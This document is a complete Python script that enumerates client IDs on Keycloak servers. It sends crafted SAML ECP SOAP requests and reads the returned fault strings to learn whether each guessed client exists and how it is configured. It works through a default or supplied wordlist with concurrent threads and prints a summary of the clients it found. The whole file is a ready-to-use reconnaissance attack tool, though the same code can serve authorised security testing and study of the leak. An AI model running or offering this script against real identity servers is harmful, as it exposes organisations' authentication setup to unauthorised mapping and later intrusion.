#!/usr/bin/env python3
"""
Keycloak SAML ECP client-ID enumerator  —  ecp_enum.py

TECHNIQUE
---------
POST /realms/{realm}/protocol/saml with a SAML ECP AuthnRequest and
`Content-Type: application/soap+xml`.  Keycloak's exception boundary
means a probe with issuer=<candidate> hits one of two paths:

  (A) SAAJ parse fails              → application/json  (parse error)
  (B) SAAJ parse succeeds           → text/xml SOAP fault
        faultstring value reveals the exact disposition of the client ID.

CLASSIFICATIONS
---------------
  NOT_FOUND              invalidRequestMessage          — no such client
  FOUND_OIDC             Wrong client protocol.         — OIDC client exists
  FOUND_DISABLED         loginRequesterNotEnabledMessage — disabled client
  FOUND_BEARER_ONLY      bearerOnlyMessage              — OIDC bearer-only
  FOUND_STANDARD_FLOW_OFF standardFlowDisabledMessage   — std flow disabled
                           (OIDC direct-grant or service-account client)
  FOUND_SAML_SIG_REQUIRED invalidRequesterMessage       — SAML, requires sig
  FOUND_SAML_ECP_DISABLED (detail) Client is not allowed… — SAML, no ECP
  FOUND_AUTH_STARTED     HTTP 2xx/3xx                   — ECP flow started
  REALM_NOT_FOUND        HTTP 404 + Realm does not exist
  REALM_DISABLED         realmNotEnabledMessage
  REALM_HTTPS_REQUIRED   httpsRequiredMessage

USAGE
-----
  py ecp_enum.py                              # built-in wordlist, master realm
  py ecp_enum.py --realm myrealm
  py ecp_enum.py --host https://kc.example.com --realm prod --workers 20
  py ecp_enum.py --wordlist clients.txt
  py ecp_enum.py --all                        # show NOT_FOUND results too
"""

import argparse
import re
import sys
import threading
import time
import urllib.error
import urllib.request
from concurrent.futures import ThreadPoolExecutor, as_completed

# ── wordlist ──────────────────────────────────────────────────────────────────

DEFAULT_WORDLIST = [
    "account",
    "account-console",
    "security-admin-console",
    "broker",
    "admin-cli",
    "realm-management",
    "master-realm",
    "test",
    "app",
    "frontend",
    "backend",
    "api",
    "web",
    "mobile",
    "service",
]

# ── classification map: faultstring → label ───────────────────────────────────

_FS_MAP = {
    "invalidRequestMessage":          "NOT_FOUND",
    "Wrong client protocol.":         "FOUND_OIDC",
    "loginRequesterNotEnabledMessage":"FOUND_DISABLED",
    "bearerOnlyMessage":              "FOUND_BEARER_ONLY",
    "standardFlowDisabledMessage":    "FOUND_STANDARD_FLOW_OFF",
    "invalidRequesterMessage":        "FOUND_SAML_SIG_REQUIRED",
    "realmNotEnabledMessage":         "REALM_DISABLED",
    "httpsRequiredMessage":           "REALM_HTTPS_REQUIRED",
}

_FOUND = {
    "FOUND_OIDC",
    "FOUND_DISABLED",
    "FOUND_BEARER_ONLY",
    "FOUND_STANDARD_FLOW_OFF",
    "FOUND_SAML_SIG_REQUIRED",
    "FOUND_SAML_ECP_DISABLED",
    "FOUND_AUTH_STARTED",
    "FOUND_SAML_OTHER",
}

_FAULTSTRING_RE = re.compile(r"<faultstring[^>]*>(.*?)</faultstring>", re.DOTALL)
_DETAIL_RE      = re.compile(r"<detail[^>]*>(.*?)</detail>",      re.DOTALL)

# ── SOAP payload ──────────────────────────────────────────────────────────────

_SOAP = """\
<?xml version="1.0" encoding="UTF-8"?>
<S:Envelope xmlns:S="http://schemas.xmlsoap.org/soap/envelope/">
  <S:Header>
    <ecp:Request xmlns:ecp="urn:oasis:names:tc:SAML:2.0:profiles:SSO:ecp"
                 S:mustUnderstand="1" IsPassive="0">
      <saml:Issuer xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">{issuer}</saml:Issuer>
    </ecp:Request>
    <paos:Request xmlns:paos="urn:liberty:paos:2003-08"
                  S:mustUnderstand="1"
                  S:actor="http://schemas.xmlsoap.org/soap/actor/next"
                  responseConsumerURL="http://localhost/acs"
                  service="urn:oasis:names:tc:SAML:2.0:profiles:SSO:ecp"/>
  </S:Header>
  <S:Body>
    <samlp:AuthnRequest xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
                        xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
                        ID="_enum" Version="2.0"
                        IssueInstant="2026-05-07T00:00:00Z"
                        AssertionConsumerServiceURL="http://localhost/acs">
      <saml:Issuer>{issuer}</saml:Issuer>
    </samlp:AuthnRequest>
  </S:Body>
</S:Envelope>"""

# ── probe ─────────────────────────────────────────────────────────────────────

def probe(endpoint: str, issuer: str, timeout: int = 10):
    """
    Returns (classification, note, elapsed_ms).
    """
    body = _SOAP.format(issuer=issuer).encode()
    req = urllib.request.Request(
        endpoint, data=body,
        headers={"Content-Type": "application/soap+xml"},
        method="POST",
    )
    t0 = time.monotonic()
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            elapsed_ms = int((time.monotonic() - t0) * 1000)
            raw = resp.read(4096).decode("utf-8", errors="replace")
            http_code = resp.status
            ct = resp.headers.get("Content-Type", "")
    except urllib.error.HTTPError as exc:
        elapsed_ms = int((time.monotonic() - t0) * 1000)
        raw = exc.read(4096).decode("utf-8", errors="replace")
        http_code = exc.code
        ct = exc.headers.get("Content-Type", "")
    except Exception as exc:
        elapsed_ms = int((time.monotonic() - t0) * 1000)
        return "ERROR", str(exc)[:80], elapsed_ms

    # ── realm does not exist ──────────────────────────────────────────────────
    if http_code == 404:
        if "Realm does not exist" in raw:
            return "REALM_NOT_FOUND", "Realm does not exist", elapsed_ms
        return f"HTTP_404", raw[:80], elapsed_ms

    # ── non-500 success / redirect — ECP auth flow actually started ───────────
    if http_code < 500:
        return "FOUND_AUTH_STARTED", f"HTTP {http_code}", elapsed_ms

    # ── JSON response — SAAJ parse failed before reaching Keycloak logic ──────
    if "application/json" in ct:
        return "PARSE_ERROR", raw[:80], elapsed_ms

    # ── SOAP fault — extract faultstring (and optional detail) ────────────────
    fs_m = _FAULTSTRING_RE.search(raw)
    if not fs_m:
        return "UNEXPECTED", raw[:120], elapsed_ms
    fs = fs_m.group(1).strip()

    if fs in _FS_MAP:
        return _FS_MAP[fs], fs, elapsed_ms

    if "error occurred" in fs.lower():
        detail_m = _DETAIL_RE.search(raw)
        detail = detail_m.group(1).strip() if detail_m else ""
        if "not allowed to use ECP" in detail:
            return "FOUND_SAML_ECP_DISABLED", detail, elapsed_ms
        return "FOUND_SAML_OTHER", detail or fs, elapsed_ms

    return f"SOAP_FAULT({fs[:40]})", fs, elapsed_ms


# ── realm pre-check ───────────────────────────────────────────────────────────

def realm_exists(host: str, realm: str, timeout: int = 5):
    url = f"{host}/realms/{realm}"
    try:
        with urllib.request.urlopen(url, timeout=timeout) as r:
            return r.status == 200
    except urllib.error.HTTPError as e:
        return e.code != 404
    except Exception:
        return False


# ── pretty printing ───────────────────────────────────────────────────────────

_LABEL_COLOUR = {
    "FOUND_OIDC":               "[OIDC]    ",
    "FOUND_DISABLED":           "[DISABLED]",
    "FOUND_BEARER_ONLY":        "[BEARER]  ",
    "FOUND_STANDARD_FLOW_OFF":  "[STD-OFF] ",
    "FOUND_SAML_SIG_REQUIRED":  "[SAML-SIG]",
    "FOUND_SAML_ECP_DISABLED":  "[SAML-ECP]",
    "FOUND_AUTH_STARTED":       "[SAML-ECP-OK]",
    "FOUND_SAML_OTHER":         "[SAML?]   ",
    "NOT_FOUND":                "[--]      ",
    "PARSE_ERROR":              "[PARSE-ERR]",
    "REALM_NOT_FOUND":          "[NO-REALM]",
    "REALM_DISABLED":           "[REALM-DIS]",
    "REALM_HTTPS_REQUIRED":     "[HTTPS]   ",
    "ERROR":                    "[ERR]     ",
}

_WHAT_IT_REVEALS = {
    "FOUND_OIDC":               "OIDC client registered with this ID",
    "FOUND_DISABLED":           "client registered but currently disabled",
    "FOUND_BEARER_ONLY":        "OIDC bearer-only client (API resource server)",
    "FOUND_STANDARD_FLOW_OFF":  "client registered, standard flow disabled (direct-grant / service-account)",
    "FOUND_SAML_SIG_REQUIRED":  "SAML client registered, signature required on AuthnRequest",
    "FOUND_SAML_ECP_DISABLED":  "SAML client registered, ECP flow not enabled on this client",
    "FOUND_AUTH_STARTED":       "SAML ECP client fully configured — authentication flow started",
    "FOUND_SAML_OTHER":         "SAML client registered (unexpected error during processing)",
}

_lock = threading.Lock()


def _print(msg: str):
    with _lock:
        print(msg, flush=True)


# ── main ──────────────────────────────────────────────────────────────────────

def run(host: str, realm: str, wordlist: list, workers: int, show_all: bool):
    endpoint = f"{host}/realms/{realm}/protocol/saml"
    SEP = "=" * 72

    print(SEP)
    print("  Keycloak SAML ECP Client Enumerator")
    print(f"  Endpoint : {endpoint}")
    print(f"  Wordlist : {len(wordlist)} entries   Workers: {workers}")
    print(SEP)

    if not realm_exists(host, realm):
        print(f"\n[!] Realm '{realm}' returned 404 — aborting.\n")
        sys.exit(1)
    print(f"[+] Realm '{realm}' exists.\n")

    results: dict[str, tuple] = {}

    with ThreadPoolExecutor(max_workers=workers) as pool:
        futures = {pool.submit(probe, endpoint, cid): cid for cid in wordlist}
        for fut in as_completed(futures):
            cid = futures[fut]
            try:
                cls, note, ms = fut.result()
            except Exception as exc:
                cls, note, ms = "ERROR", str(exc), 0
            results[cid] = (cls, note, ms)

            label = _LABEL_COLOUR.get(cls, f"[{cls}]")
            is_found = cls in _FOUND
            if is_found or show_all:
                _print(f"  {label}  {cid:<35}  ({ms:>4}ms)")

    # ── summary ───────────────────────────────────────────────────────────────
    found = [(cid, cls, note, ms)
             for cid in wordlist
             for (cls, note, ms) in [results.get(cid, ("?", "", 0))]
             if cls in _FOUND]

    print(f"\n{SEP}")
    print(f"  FOUND: {len(found)} of {len(wordlist)} probed")
    print(SEP)
    if found:
        print(f"\n  {'Client ID':<35}  {'Classification':<26}  What it reveals")
        print(f"  {'-'*35}  {'-'*26}  {'-'*40}")
        for cid, cls, note, ms in found:
            reveals = _WHAT_IT_REVEALS.get(cls, note[:60])
            print(f"  {cid:<35}  {cls:<26}  {reveals}")
    print()


def main():
    p = argparse.ArgumentParser(
        description="Keycloak SAML ECP client-ID enumerator",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    p.add_argument("--host",     default="http://localhost:8080",
                   help="Keycloak base URL (default: http://localhost:8080)")
    p.add_argument("--realm",    default="master",
                   help="Realm to enumerate (default: master)")
    p.add_argument("--wordlist", help="Path to newline-separated client-ID file")
    p.add_argument("--workers",  type=int, default=10,
                   help="Concurrent threads (default: 10)")
    p.add_argument("--all",      action="store_true", dest="show_all",
                   help="Also print NOT_FOUND / PARSE_ERROR lines")
    args = p.parse_args()

    if args.wordlist:
        with open(args.wordlist) as f:
            wordlist = [ln.strip() for ln in f if ln.strip()]
    else:
        wordlist = DEFAULT_WORDLIST

    run(args.host, args.realm, wordlist, args.workers, args.show_all)


if __name__ == "__main__":
    main()
